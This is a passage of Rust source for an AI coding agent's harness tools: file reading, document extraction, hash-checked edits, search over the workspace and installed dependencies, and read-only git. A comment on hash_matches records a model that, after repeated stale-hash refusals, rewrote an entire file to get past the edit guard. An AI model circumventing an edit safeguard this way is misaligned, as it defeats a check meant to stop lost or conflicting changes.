        retained.pop();
        selected_bytes = selected_bytes.saturating_sub(1);
    }
    let bounded = selected_bytes > retained.len();
    let content = String::from_utf8_lossy(&retained).to_string();
    let (content, redacted) = policy.redact(&content);
    let artifact_hash = hasher.finalize().to_hex().to_string();
    let truncated = bounded || first > 1 || last < total_lines;
    let within = if first > 1 && metadata.len() <= WITHIN_READ_LIMIT {
        std::fs::read(&path).ok().and_then(|bytes| {
            let text = String::from_utf8_lossy(&bytes);
            let all: Vec<&str> = text.lines().collect();
            enclosing_definitions(&all, first - 1)
        })
    } else {
        None
    };
    let edit_note = truncated.then(|| {
        let shown_to = first
            .saturating_add(content.lines().count())
            .saturating_sub(1)
            .min(total_lines);
        format!(
            "Shown: lines {first}-{shown_to} of {total_lines}. expected_hash is the hash of the \
             whole file. To change only some lines use replace_text; apply_replace replaces \
             all {total_lines} lines with its replacement."
        )
    });
    Ok(FileReadResult {
        path: relative.display().to_string(),
        artifact_hash: artifact_hash.clone(),
        expected_hash: artifact_hash,
        content,
        truncated,
        redacted,
        total_lines,
        first_line: first,
        edit_note,
        outline: None,
        within,
    })
}

/// A Markdown document longer than this, asked for whole, comes back as its
/// outline and its opening lines.
pub const LONG_DOCUMENT_BYTES: u64 = 24 * 1024;
/// The opening lines returned with a long document's outline.
const LONG_DOCUMENT_HEAD_LINES: usize = 80;

/// `read_file` as the model calls it.
///
/// A whole read of a long Markdown document returns its headings with line
/// numbers and its first lines instead of all of it. Measured 2026-09-22
/// (D.E2E-15, Qwen3.6-35B-A3B on an M2 Max): reading `docs/roadmap.md` whole
/// took the context from 21K to 38K tokens in one step and 222 s of prefill,
/// and nine documents read that way came before the first edit. Code and
/// short documents are read as before, and a window (`first_line`,
/// `max_lines`) is always honoured as asked.
pub fn read_file_for_model(
    policy: &ToolPolicy,
    relative: &Path,
    first_line: Option<usize>,
    max_lines: Option<usize>,
) -> Result<FileReadResult, ToolError> {
    let whole = first_line.is_none() && max_lines.is_none();
    let markdown = relative
        .extension()
        .and_then(|extension| extension.to_str())
        .is_some_and(|extension| {
            matches!(
                extension.to_ascii_lowercase().as_str(),
                "md" | "markdown" | "mdx"
            )
        });
    let long = whole
        && markdown
        && policy
            .resolve_readable(relative)
            .ok()
            .and_then(|path| std::fs::metadata(path).ok())
            .is_some_and(|metadata| metadata.is_file() && metadata.len() > LONG_DOCUMENT_BYTES);
    if !long {
        return read_file_window(policy, relative, first_line, max_lines);
    }
    let mut result = read_file_window(policy, relative, Some(1), Some(LONG_DOCUMENT_HEAD_LINES))?;
    let text = policy
        .resolve_readable(relative)
        .ok()
        .and_then(|path| std::fs::read_to_string(path).ok())
        .unwrap_or_default();
    let mut fenced = false;
    let headings: Vec<String> = text
        .lines()
        .enumerate()
        .filter_map(|(index, line)| {
            if line.trim_start().starts_with("```") {
                fenced = !fenced;
                return None;
            }
            (!fenced && line.starts_with('#') && line.trim_start_matches('#').starts_with(' '))
                .then(|| format!("{:>5}  {}", index + 1, line.trim_end()))
        })
        .collect();
    let approximate_tokens = text.len() / 4;
    result.outline = Some(format!(
        "This document is long ({} lines, about {approximate_tokens} tokens), so only its first \
         {} lines are shown. Its sections, by starting line -- read the ones the task needs \
         with first_line and max_lines:\n{}",
        result.total_lines,
        LONG_DOCUMENT_HEAD_LINES.min(result.total_lines),
        headings.join("\n")
    ));
    Ok(result)
}
/// What an extraction produced, and where the text now lives.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DocumentExtraction {
    /// Workspace-relative path of the text file that was written.
    pub path: String,
    /// The document it came from.
    pub source: String,
    /// Hash of the source document, so a later quotation can be traced to it.
    pub source_hash: String,
    /// Hash of the text file, in the shape an edit would need.
    pub artifact_hash: String,
    pub expected_hash: String,
    pub total_lines: usize,
    pub pages: Option<usize>,
    pub links: Vec<String>,
    /// The first lines of it, so a caller learns what it got without a second
    /// action, and can decide whether the rest is worth reading.
    pub preview: String,
    pub redacted: bool,
}

/// Recovers a document's text into a text file beside it, and says where.
///
/// Written rather than returned whole because a CV is several thousand tokens
/// and the run that needed one had to survive two compactions: a file can be
/// re-read in windows, searched, and quoted against afterwards, while a tool
/// result can only be remembered. The header records where the text came from,
/// so a claim the run makes about the document can be checked against the
/// document rather than against the model's memory of it.
pub fn extract_document(
    policy: &ToolPolicy,
    relative: &Path,
) -> Result<DocumentExtraction, ToolError> {
    let path = policy.resolve(relative)?;
    if !std::fs::metadata(&path)?.is_file() {
        return Err(ToolError::Denied(
            "extraction target is not a regular file".into(),
        ));
    }
    let bytes = std::fs::read(&path)?;
    let source_hash = hash_bytes(&bytes);
    let extraction = document::extract(&bytes)
        .map_err(|failure| ToolError::Denied(format!("{}: {failure}", relative.display())))?;

    let target = PathBuf::from(format!("{}.txt", relative.display()));
    policy.refuse_if_protected(&target)?;
    let target_path = policy.resolve(&target)?;
    let mut body = String::new();
    body.push_str(&format!("# text extracted from {}\n", relative.display()));
    body.push_str(&format!("# source-hash: {source_hash}\n"));
    body.push_str(&format!("# extractor: PWR, {}\n", extraction.method));
    if let Some(pages) = extraction.pages {
        body.push_str(&format!("# pages: {pages}\n"));
    }
    for link in &extraction.links {
        body.push_str(&format!("# link: {link}\n"));
    }
    body.push_str(
        "# layout is not preserved; this is the text the content streams give, in their order\n\n",
    );
    body.push_str(&extraction.text);
    body.push('\n');

    // An existing extraction of the same document is left alone: rewriting it
    // would change a hash the caller may already be holding, and an extraction
    // that differs from the one on disk is a fact worth refusing over.
    if target_path.exists() {
        let existing = std::fs::read_to_string(&target_path)?;
        if existing != body {
            return Err(ToolError::Denied(format!(
                "{} already exists and differs from this extraction; read it, or remove it first",
                target.display()
            )));
        }
    } else {
        atomic::write_atomic(&target_path, body.as_bytes(), atomic::Expect::Absent)?;
    }

    let total_lines = body.lines().count();
    let preview: String = body.lines().take(24).collect::<Vec<_>>().join("\n");
    let (preview, redacted) = policy.redact(&preview);
    let artifact_hash = hash_bytes(&body);
    Ok(DocumentExtraction {
        path: target.display().to_string(),
        source: relative.display().to_string(),
        source_hash,
        artifact_hash: artifact_hash.clone(),
        expected_hash: artifact_hash,
        total_lines,
        pages: extraction.pages,
        links: extraction.links,
        preview,
        redacted,
    })
}

/// Whether the hash a caller sent names the file as it is now.
///
/// The guard exists to refuse an edit to a file that changed after the caller
/// read it, and it did that by demanding a 64-character transcription. A local
/// model copying that string sometimes gets one character wrong: on 2026-09-18
/// Qwen3.6 at 4-bit wrote `...5684405bbfe9e...` for `...5684405bfe9e...`, and
/// every edit it tried was refused as stale over a doubled letter. That is
/// bookkeeping the harness should not make the model do perfectly.
///
/// So a claim within two edits of the current hash is the current hash, and so
/// is a prefix of at least twelve characters. The guard keeps its whole
/// strength: a file that has changed hashes to an unrelated string sixty-odd
/// edits away, so a stale claim cannot fall within two of it, and twelve hex
/// characters are 48 bits of the new hash.
///
/// And so is a claim that begins with the current hash's first sixteen
/// characters, whatever follows. Seen 2026-09-23 (web_pwr, Qwen3.6): the
/// model wrote `c635b6af191dbe933847f09c5029...` for `c635b6af191dbe933847fde1
/// e6ed...` -- the right twenty characters, then the tail of another file's
/// hash -- five times running, even with the right hash in each refusal, and
/// finally rewrote the whole file to get past it. Sixteen characters are 64
/// bits of the new hash: a stale claim does not begin with them.
pub fn hash_matches(current: &str, claimed: &str) -> bool {
    let claimed = claimed.trim();
    if claimed == current {
        return true;
    }
    if claimed.len() >= 12 && current.starts_with(claimed) {
        return true;
    }
    if claimed.len() >= 16 && current.get(..16) == claimed.get(..16) {
        return true;
    }
    claimed.len() + 2 >= current.len() && within_two_edits(current.as_bytes(), claimed.as_bytes())
}

/// Levenshtein distance of at most two, computed only as far as it needs to be.
fn within_two_edits(a: &[u8], b: &[u8]) -> bool {
    if a.len().abs_diff(b.len()) > 2 {
        return false;
    }
    let mut previous: Vec<usize> = (0..=b.len()).collect();
    for (i, &x) in a.iter().enumerate() {
        let mut row = vec![i + 1; b.len() + 1];
        for (j, &y) in b.iter().enumerate() {
            let substitution = previous[j] + usize::from(x != y);
            row[j + 1] = substitution.min(previous[j + 1] + 1).min(row[j] + 1);
        }
        if row.iter().min().copied().unwrap_or(0) > 2 {
            return false;
        }
        previous = row;
    }
    previous[b.len()] <= 2
}

/// What to look for, and where.
///
/// A struct rather than four arguments because two of the four decide what the
/// pattern *means*: the same string is a literal or a regular expression
/// depending on `regex`, and reading that at a call site as a bare `false` says
/// nothing.
#[derive(Debug, Clone)]
pub struct SearchQuery {
    pub pattern: String,
    /// Treat `pattern` as a regular expression rather than as literal text.
    pub regex: bool,
    /// Restrict the walk to paths matching this glob, in gitignore syntax with
    /// its sense inverted: a bare glob includes, and a leading `!` excludes.
    pub path_glob: Option<String>,
    pub max_matches: usize,
}

impl SearchQuery {
    /// The literal search this crate has always offered.
    pub fn literal(pattern: impl Into<String>, max_matches: usize) -> Self {
        Self {
            pattern: pattern.into(),
            regex: false,
            path_glob: None,
            max_matches,
        }
    }
}

/// How a line is tested, compiled once before the walk rather than per line.
enum Matcher {
    Literal(String),
    Pattern(Regex),
}

impl Matcher {
    fn compile(query: &SearchQuery) -> Result<Self, ToolError> {
        if !query.regex {
            return Ok(Self::Literal(query.pattern.clone()));
        }
        // A pattern that does not compile is refused, never quietly searched
        // for as literal text. A tool that changes what a call means when the
        // call is wrong returns a plausible answer to a question nobody asked,
        // and the caller has no way to tell.
        regex::RegexBuilder::new(&query.pattern)
            .size_limit(MAX_REGEX_BYTES)
            .build()
            .map(Self::Pattern)
            .map_err(|error| {
                ToolError::Denied(format!(
                    "`{}` is not a valid regular expression: {error}. Fix the pattern, or search \
                     for it as literal text by leaving regex unset.",
                    query.pattern
                ))
            })
    }

    fn matches(&self, line: &str) -> bool {
        match self {
            Self::Literal(needle) => line.contains(needle),
            Self::Pattern(pattern) => pattern.is_match(line),
        }
    }
}

/// Builds the walk filter for a `path_glob`, or nothing when there is none.
fn path_filter(
    root: &Path,
    glob: Option<&str>,
) -> Result<Option<ignore::overrides::Override>, ToolError> {
    let Some(glob) = glob else {
        return Ok(None);
    };
    if glob.trim().is_empty() {
        return Err(ToolError::Denied("empty path_glob".into()));
    }
    let mut builder = ignore::overrides::OverrideBuilder::new(root);
    builder.add(glob).map_err(|error| {
        ToolError::Denied(format!(
            "`{glob}` is not a valid path glob: {error}. It is gitignore syntax -- `**/*.rs`, \
             `src/**` -- with a leading `!` to exclude instead of include."
        ))
    })?;
    builder
        .build()
        .map(Some)
        .map_err(|error| ToolError::Denied(format!("`{glob}` is not a valid path glob: {error}")))
}

/// Searches only text files below the policy root and returns a bounded match list.
pub fn search(
    policy: &ToolPolicy,
    query: &str,
    max_matches: usize,
) -> Result<SearchResult, ToolError> {
    search_query(policy, &SearchQuery::literal(query, max_matches))
}

/// Searches text files below the policy root, grouped by file and bounded twice.
///
/// The bounds are `max_matches` over the whole search and `MAX_MATCHES_PER_FILE`
/// within each file, and they answer different questions: the first is what the
/// caller asked to see, the second is what stops one dense file from being the
/// entire answer.
pub fn search_query(policy: &ToolPolicy, query: &SearchQuery) -> Result<SearchResult, ToolError> {
    if query.pattern.is_empty() {
        return Err(ToolError::Denied("empty search query".into()));
    }
    let matcher = Matcher::compile(query)?;
    let (glob, note) = directory_glob(&policy.root, query.path_glob.as_deref());
    let filter = path_filter(&policy.root, glob.as_deref())?;
    let mut files_named: Vec<String> = Vec::new();
    let deadline = std::time::Instant::now() + policy.timeout;
    let mut files: Vec<SearchFile> = Vec::new();
    let mut returned = 0usize;
    let mut files_matched = 0usize;
    let mut output_bytes = 0usize;
    let mut scan = Scan::default();
    // Set wherever the walk stops for a reason other than running out of
    // files. Whichever bound bites, the caller is told the same thing: there
    // are more matches than these.
    let mut truncated = false;
    for (path, directory) in walk_workspace_filtered(&policy.root, filter.as_ref())? {
        if std::time::Instant::now() >= deadline {
            return Err(ToolError::Timeout);
        }
        if returned >= query.max_matches || output_bytes >= policy.output_limit {
            truncated = true;
            break;
        }
        if directory {
            continue;
        }
        let metadata = std::fs::symlink_metadata(&path)?;
        if metadata.len() > MAX_SEARCHED_BYTES {
            continue;
        }
        let bytes = std::fs::read(&path)?;
        if binary_reason(&bytes).is_some() {
            continue;
        }
        let relative = path
            .strip_prefix(&policy.root)
            .unwrap_or(&path)
            .display()
            .to_string();
        if files_named.len() < MAX_FILES_NAMED && matcher.matches(&relative) {
            files_named.push(relative.clone());
        }
        let scanned = scan.file(policy, &matcher, &bytes, &relative, query.max_matches);
        returned = scan.returned;
        output_bytes = scan.output_bytes;
        if scanned.matched {
            files_matched += 1;
        }
        if let Some(file) = scanned.file {
            files.push(file);
        }
        let spent = scan.spent;
        if spent || returned >= query.max_matches {
            truncated = true;
            break;
        }
    }
    Ok(SearchResult {
        files,
        files_matched,
        matches_returned: returned,
        truncated,
        files_named,
        note,
    })
}

/// The bounded scan of one file, shared by the workspace search and the
/// dependency search so both spend their budget the same way.
#[derive(Default)]
struct Scan {
    returned: usize,
    output_bytes: usize,
    /// The output limit was reached inside a file, so the search is over.
    spent: bool,
}

struct Scanned {
    file: Option<SearchFile>,
    matched: bool,
}

impl Scan {
    fn file(
        &mut self,
        policy: &ToolPolicy,
        matcher: &Matcher,
        bytes: &[u8],
        display: &str,
        max_matches: usize,
    ) -> Scanned {
        let mut lines = Vec::new();
        let mut more = 0usize;
        let mut matched = false;
        let text = String::from_utf8_lossy(bytes);
        let all: Vec<&str> = text.lines().collect();
        for (number, line) in all.iter().copied().enumerate() {
            if !matcher.matches(line) {
                continue;
            }
            matched = true;
            // Counted, not returned. Three different bounds land here and the
            // caller is told the same thing by all of them: this file holds
            // more than it was shown. The file is already read and already
            // being scanned, so finishing the count is free -- and stopping
            // the count at the bound instead would leave the file that the
            // search stopped inside reporting `more: 0`, which reads as "this
            // is all of it" about the one file where it is least true.
            if self.spent || lines.len() >= MAX_MATCHES_PER_FILE || self.returned >= max_matches {
                more += 1;
                continue;
            }
            let cost = if lines.is_empty() { display.len() } else { 0 };
            let remaining = policy
                .output_limit
                .saturating_sub(self.output_bytes)
                .saturating_sub(cost);
            if remaining == 0 {
                self.spent = true;
                more += 1;
                continue;
            }
            let raw: String = line.chars().take(remaining).collect();
            let (excerpt, redacted) = policy.redact(&raw);
            self.output_bytes = self
                .output_bytes
                .saturating_add(cost)
                .saturating_add(excerpt.len());
            lines.push(SearchLine {
                line: number + 1,
                excerpt,
                redacted,
                within: enclosing_definitions(&all, number),
            });
            self.returned += 1;
        }
        Scanned {
            file: (!lines.is_empty()).then(|| SearchFile {
                path: display.to_owned(),
                lines,
                more,
            }),
            matched,
        }
    }
}

/// An installed dependency's source on this machine.
///
/// What a model does not know about a library is usually already on disk, in
/// the exact version the project builds against: `node_modules`, a virtual
/// environment's `site-packages`, the cargo registry's unpacked sources. It is
/// offline, free, and not a third-party page that might carry instructions --
/// which is why the backlog (C.12) puts installed dependencies before the web.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DependencySource {
    /// How the model sees it: `node_modules/left-pad`, `cargo/serde-1.0.219`.
    pub label: String,
    pub path: PathBuf,
}

/// Packages this project declares, as they are installed here.
///
/// Declared, not merely present: the lockfile or manifest decides what is
/// searched, so a stale package left in a registry cache is not evidence about
/// this project.
pub fn dependency_sources(root: &Path) -> Vec<DependencySource> {
    dependency_sources_in(root, cargo_home().as_deref())
}

/// [`dependency_sources`] with the cargo home named rather than read from the
/// environment. Exists so the registry half can be tested without changing a
/// process-wide variable.
pub fn dependency_sources_with_cargo_home(
    root: &Path,
    cargo_home: Option<&Path>,
) -> Vec<DependencySource> {
    dependency_sources_in(root, cargo_home)
}

fn cargo_home() -> Option<PathBuf> {
    std::env::var_os("CARGO_HOME")
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|home| PathBuf::from(home).join(".cargo")))
}

/// At most this many packages of one ecosystem, newest declaration first. A
/// lockfile with two thousand crates would otherwise make every search a walk
/// of the machine.
const MAX_DEPENDENCY_PACKAGES: usize = 300;

fn dependency_sources_in(root: &Path, cargo_home: Option<&Path>) -> Vec<DependencySource> {
    let mut sources = Vec::new();
    // Node: the names package.json declares, as installed.
    let modules = root.join("node_modules");
    if modules.is_dir() {
        let mut names = declared_node_packages(root);
        if names.is_empty() {
            names = directory_names(&modules);
        }
        for name in names.into_iter().take(MAX_DEPENDENCY_PACKAGES) {
            let path = modules.join(&name);
            if path.is_dir() {
                sources.push(DependencySource {
                    label: format!("node_modules/{name}"),
                    path,
                });
            }
        }
    }
    // Python: whatever the project's own virtual environment has installed.
    for environment in [".venv", "venv", "env"] {
        let Ok(entries) = std::fs::read_dir(root.join(environment).join("lib")) else {
            continue;
        };
        for entry in entries.flatten() {
            let packages = entry.path().join("site-packages");
            if !packages.is_dir() {
                continue;
            }
            for name in directory_names(&packages)
                .into_iter()
                .filter(|name| !name.ends_with(".dist-info") && name != "__pycache__")
                .take(MAX_DEPENDENCY_PACKAGES)
            {
                sources.push(DependencySource {
                    label: format!("site-packages/{name}"),
                    path: packages.join(&name),
                });
            }
        }
    }
    // Rust: the versions Cargo.lock pins, unpacked in the registry.
    if let Some(home) = cargo_home {
        let registry = home.join("registry/src");
        for (name, version) in locked_crates(root)
            .into_iter()
            .take(MAX_DEPENDENCY_PACKAGES)
        {
            let folder = format!("{name}-{version}");
            let Ok(indexes) = std::fs::read_dir(&registry) else {
                break;
            };
            for index in indexes.flatten() {
                let path = index.path().join(&folder);
                if path.is_dir() {
                    sources.push(DependencySource {
                        label: format!("cargo/{folder}"),
                        path,
                    });
                    break;
                }
            }
        }
    }
    sources
}

fn directory_names(path: &Path) -> Vec<String> {
    let Ok(entries) = std::fs::read_dir(path) else {
        return Vec::new();
    };
    let mut names: Vec<String> = entries
        .flatten()
        .filter(|entry| entry.path().is_dir())
        .map(|entry| entry.file_name().to_string_lossy().into_owned())
        .filter(|name| !name.starts_with('.'))
        .collect();
    names.sort();
    names
}

/// The names under `dependencies` and `devDependencies` in `package.json`.
///
/// Read line by line rather than with a JSON parser, which this crate does not
/// depend on: the file is generated or hand-written in the same shape, and a
/// name that is missed only means one package is not searched.
fn declared_node_packages(root: &Path) -> Vec<String> {
    let Ok(text) = std::fs::read_to_string(root.join("package.json")) else {
        return Vec::new();
    };
    let mut names = Vec::new();
    let mut inside = false;
    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("\"dependencies\"") || trimmed.starts_with("\"devDependencies\"") {
            inside = trimmed.ends_with('{');
            continue;
        }
        if !inside {
            continue;
        }
        if trimmed.starts_with('}') {
            inside = false;
            continue;
        }
        if let Some(rest) = trimmed.strip_prefix('"')
            && let Some((name, _)) = rest.split_once('"')
            && !name.is_empty()
        {
            names.push(name.to_owned());
        }
    }
    names.sort();
    names.dedup();
    names
}

/// `name` and `version` of each `[[package]]` in `Cargo.lock`, read without a
/// TOML parser: the file is generated, and these two lines are its shape.
fn locked_crates(root: &Path) -> Vec<(String, String)> {
    let Ok(text) = std::fs::read_to_string(root.join("Cargo.lock")) else {
        return Vec::new();
    };
    let mut crates = Vec::new();
    let mut name: Option<String> = None;
    for line in text.lines() {
        let line = line.trim();
        if line == "[[package]]" {
            name = None;
        } else if let Some(value) = line.strip_prefix("name = ") {
            name = Some(value.trim_matches('"').to_owned());
        } else if let Some(value) = line.strip_prefix("version = ")
            && let Some(name) = name.take()
        {
            crates.push((name, value.trim_matches('"').to_owned()));
        }
    }
    crates
}

/// The coarse roots the sandbox and `read_file` are opened to, so a passage
/// found in a dependency can then be read. Broader than the packages searched
/// on purpose: one subpath per ecosystem rather than three hundred.
pub fn dependency_roots(root: &Path) -> Vec<PathBuf> {
    let mut roots = Vec::new();
    let modules = root.join("node_modules");
    if modules.is_dir() {
        roots.push(modules);
    }
    for environment in [".venv", "venv", "env"] {
        let Ok(entries) = std::fs::read_dir(root.join(environment).join("lib")) else {
            continue;
        };
        for entry in entries.flatten() {
            let packages = entry.path().join("site-packages");
            if packages.is_dir() {
                roots.push(packages);
            }
        }
    }
    if let Some(registry) = cargo_home().map(|home| home.join("registry/src"))
        && registry.is_dir()
        && root.join("Cargo.lock").is_file()
    {
        roots.push(registry);
    }
    roots
}

/// Searches the installed sources of the packages this project declares.
///
/// Read-only and bounded exactly as the workspace search is. Paths come back
/// absolute, because that is what `read_file` needs to open them: the
/// dependency roots are declared readable, and nothing there can be written.
pub fn search_dependencies(
    policy: &ToolPolicy,
    query: &SearchQuery,
) -> Result<SearchResult, ToolError> {
    if query.pattern.is_empty() {
        return Err(ToolError::Denied("empty search query".into()));
    }
    let sources = dependency_sources(&policy.root);
    if sources.is_empty() {
        return Err(ToolError::Denied(
            "this workspace has no installed dependencies to search: none of node_modules, a \
             virtual environment's site-packages, or a Cargo.lock with an unpacked registry was \
             found. Install them first, or search the workspace instead."
                .into(),
        ));
    }
    let matcher = Matcher::compile(query)?;
    let deadline = std::time::Instant::now() + policy.timeout;
    let mut scan = Scan::default();
    let mut files = Vec::new();
    let mut files_matched = 0usize;
    let mut truncated = false;
    'sources: for source in &sources {
        for (path, directory) in walk_tree(&source.path)? {
            if std::time::Instant::now() >= deadline {
                truncated = true;
                break 'sources;
            }
            if scan.returned >= query.max_matches || scan.output_bytes >= policy.output_limit {
                truncated = true;
                break 'sources;
            }
            if directory {
                continue;
            }
            let Ok(metadata) = std::fs::symlink_metadata(&path) else {
                continue;
            };
            if metadata.len() > MAX_SEARCHED_BYTES {
                continue;
            }
            let Ok(bytes) = std::fs::read(&path) else {
                continue;
            };
            if binary_reason(&bytes).is_some() {
                continue;
            }
            let display = path.display().to_string();
            let scanned = scan.file(policy, &matcher, &bytes, &display, query.max_matches);
            if scanned.matched {
                files_matched += 1;
            }
            if let Some(file) = scanned.file {
                files.push(file);
            }
            if scan.spent {
                truncated = true;
                break 'sources;
            }
        }
    }
    Ok(SearchResult {
        files,
        files_matched,
        matches_returned: scan.returned,
        truncated,
        files_named: Vec::new(),
        note: Some(format!(
            "searched {} installed package(s) of this project; paths are absolute and readable \
             with read_file, and nothing there can be edited",
            sources.len()
        )),
    })
}

/// Walks a directory that is not the workspace: no gitignore semantics, and
/// the noise directories of a package tree left out.
fn walk_tree(base: &Path) -> Result<Vec<(PathBuf, bool)>, ToolError> {
    const SKIPPED: [&str; 6] = [
        ".git",
        "__pycache__",
        "node_modules",
        "target",
        "dist",
        ".venv",
    ];
    let mut entries = Vec::new();
    let walker = ignore::WalkBuilder::new(base)
        .hidden(false)
        .git_ignore(false)
        .git_global(false)
        .require_git(false)
        .parents(false)
        .follow_links(false)
        .sort_by_file_path(std::path::Path::cmp)
        .filter_entry(|entry| {
            entry.depth() == 0 || !SKIPPED.iter().any(|skip| entry.file_name() == *skip)
        })
        .build();
    for entry in walker.flatten() {
        let directory = entry.file_type().is_some_and(|kind| kind.is_dir());
        entries.push((entry.into_path(), directory));
    }
    Ok(entries)
}

/// Paths reported by name match, at most. Names are short, and a query common
/// enough to exceed this is not one a caller is using to find a file.
const MAX_FILES_NAMED: usize = 20;

/// Reads a `path_glob` that names a directory as "inside this directory".
///
/// In gitignore syntax `tests/data/valid` matches the directory itself and no
/// file in it, so the search walked nothing and reported nothing -- which a
/// caller reads as "the term is not there". A glob with no pattern characters
/// that names an existing directory is taken to mean its contents, and the
/// result says so.
fn directory_glob(root: &Path, glob: Option<&str>) -> (Option<String>, Option<String>) {
    let Some(glob) = glob else {
        return (None, None);
    };
    let bare = glob.trim().trim_end_matches('/');
    let is_pattern = bare.contains(['*', '?', '[', '{', '!']);
    if !bare.is_empty() && !is_pattern && root.join(bare).is_dir() {
        let widened = format!("{bare}/**");
        let note = format!(
            "path_glob `{glob}` names a directory, so its contents were searched (`{widened}`)."
        );
        (Some(widened), Some(note))
    } else {
        (Some(glob.to_owned()), None)
    }
}

/// Finds where a name is declared, rather than everywhere it is mentioned.
///
/// A deterministic query rather than a new kind of search: it builds the
/// pattern a caller would have to know the language to write, and runs it
/// through `search_query` like any other. Nothing new reads the filesystem, so
/// the policy, the redaction and the bounds are the ones already tested.
///
/// The declaration grammar is `pwr-repo`'s, which retrieval already ranks
/// with -- `modifier* keyword Name` across the languages a repository is likely
/// to be written in. Shallow on purpose, and shallow in the same way in both
/// places, because two definitions of what a declaration is would eventually
/// disagree about the same file.
pub fn find_definition(
    policy: &ToolPolicy,
    name: &str,
    path_glob: Option<&str>,
    max_matches: usize,
) -> Result<SearchResult, ToolError> {
    let trimmed = name.trim();
    if trimmed.is_empty() {
        return Err(ToolError::Denied("empty name".into()));
    }
    if trimmed.split_whitespace().count() > 1 {
        return Err(ToolError::Denied(format!(
            "`{trimmed}` is not a name. This finds where a single identifier is declared; use \
             search for anything longer."
        )));
    }
    let keywords = pwr_repo::DECLARATION_KEYWORDS.join("|");
    let pattern = format!(r"(?:^|[^\w.])(?:{keywords})\s+{}\b", regex::escape(trimmed));
    search_query(
        policy,
        &SearchQuery {
            pattern,
            regex: true,
            path_glob: path_glob.map(str::to_owned),
            max_matches,
        },
    )
}

/// What version control says about the workspace, structurally.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct VcsStatus {
    /// Absent where the workspace is not a checkout, rather than invented.
    pub branch: Option<String>,
    pub head: Option<String>,
    /// Paths changed since HEAD, with the two-letter porcelain code.
    pub changed: Vec<(String, String)>,
    pub truncated: bool,
}

/// Reads the working tree's status without changing anything.
///
/// The ledger names the files a session changed and their hashes, which
/// answers *what* and not *how much*. An agent could not see its own
/// accumulated change at all: it had to remember every file it had touched,
/// and a hash is not a diff.
///
/// Read-only by construction -- there is no argument here that reaches a
/// mutating subcommand, which is what keeps this out of the approval path that
/// `git clean` and `git push` sit behind.
pub async fn vcs_status(policy: &ToolPolicy) -> Result<VcsStatus, ToolError> {
    let porcelain = git_read(policy, &["status", "--porcelain=v1", "--branch"]).await?;
    let mut status = VcsStatus::default();
    let subdir = git_subdir(policy);
    for line in porcelain.lines() {
        if let Some(header) = line.strip_prefix("## ") {
            status.branch = header
                .split(['.', ' '])
                .next()
                .filter(|name| !name.is_empty() && *name != "HEAD")
                .map(str::to_string);
            continue;
        }
        if line.len() < 4 {
            continue;
        }
        let (code, path) = line.split_at(2);
        let path = path.trim().trim_matches('"');
        let path = subdir
            .as_ref()
            .map_or_else(|| path.to_string(), |dir| format!("{dir}/{path}"));
        status.changed.push((code.trim().to_string(), path));
    }
    status.head = git_read(policy, &["rev-parse", "HEAD"])
        .await
        .ok()
        .map(|head| head.trim().to_string())
        .filter(|head| !head.is_empty());
    Ok(status)
}

/// The working tree's diff against HEAD, bounded like any other output.
///
/// `paths` narrows it, because a whole-repository diff is usually not the
/// question and always the largest possible answer.
pub async fn vcs_diff(policy: &ToolPolicy, paths: &[String]) -> Result<ToolResult, ToolError> {
    let mut args: Vec<String> = vec![
        "diff".into(),
        // A diff read by a model has no use for colour or pager control
        // sequences, and they are bytes off the output budget.
        "--no-color".into(),
        "--no-ext-diff".into(),
    ];
    if !paths.is_empty() {
        args.push("--".into());
        if let Some(dir) = git_subdir(policy) {
            for path in paths {
                let relative = path.strip_prefix(&format!("{dir}/")).ok_or_else(|| {
                    ToolError::Denied(format!(
                        "{path} is outside the only Git checkout in this workspace ({dir})"
                    ))
                })?;
                args.push(relative.into());
            }
        } else {
            args.extend(paths.iter().cloned());
        }
    }
    run_git(policy, &args).await
}

/// Writes a file back to the bytes it had when the run first saw it.
///
/// A way back from a broken edit. Seen twice on 2026-09-18 (Part E on the
/// engine): a model replaced most of a file by mistake, tried `git checkout`,
/// was refused -- an evaluation workspace has no `.git`, and git is not a
/// command a run may execute -- and spent the rest of its budget rebuilding
/// the file by hand. The caller holds the original; this writes it under the
/// same guards as any edit.
pub fn restore_file(
    policy: &ToolPolicy,
    relative: &Path,
    original: &[u8],
) -> Result<ApplyResult, ToolError> {
    policy.refuse_if_protected(relative)?;
    if let Some(approval) = edit_approval(relative) {
        policy.require(approval)?;
    }
    let path = policy.resolve(relative)?;
    let previous_hash = std::fs::read(&path).map(hash_bytes).unwrap_or_default();
    let new_hash = hash_bytes(original);
    if previous_hash == new_hash {
        return Err(ToolError::Denied(format!(
            "{} is already exactly as it was when this run first saw it; nothing to restore.",
            relative.display()
        )));
    }
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    atomic::write_atomic(&path, original, atomic::Expect::Anything)?;
    Ok(ApplyResult {
        path: relative.display().to_string(),
        normalized: None,
        previous_hash,
        expected_hash: new_hash.clone(),
        new_hash,
        warning: None,
        excerpt: None,
    })
}

/// Runs a read-only git subcommand and returns its stdout.
async fn git_read(policy: &ToolPolicy, args: &[&str]) -> Result<String, ToolError> {
    let args: Vec<String> = args.iter().map(|arg| (*arg).to_string()).collect();
    let result = run_git(policy, &args).await?;
    if result.exit_code != Some(0) {
        return Err(ToolError::Denied(format!(
            "git {} failed: {}",
            args.join(" "),
            result.stderr.trim()
        )));
    }
    Ok(result.stdout)
}

/// Runs git under the tool policy, bypassing the derived command allowlist.
///
/// The allowlist is derived from what the repository declares as its checks,
/// and a repository does not declare `git` as a way of verifying itself. These
/// subcommands are read-only and fixed here rather than named by a caller, so
/// nothing the deployment sends can turn one into a mutation.
async fn run_git(policy: &ToolPolicy, args: &[String]) -> Result<ToolResult, ToolError> {
    let git = git_program();
    let mut policy = policy.clone();
    if !policy.allow_commands.iter().any(|c| c == git) {
        policy.allow_commands.push(git.into());
    }
    let subdir = git_subdir(&policy);
    run_command_in(&policy, git, args, None, subdir.as_deref()).await
}

/// A workspace may contain one generated project with its own checkout.
/// Use it only when the workspace itself is not already inside a checkout;
/// multiple nested repositories are ambiguous and remain an explicit error.
fn git_subdir(policy: &ToolPolicy) -> Option<String> {
    if policy
        .root
        .ancestors()
        .any(|ancestor| ancestor.join(".git").exists())
    {
        return None;
    }
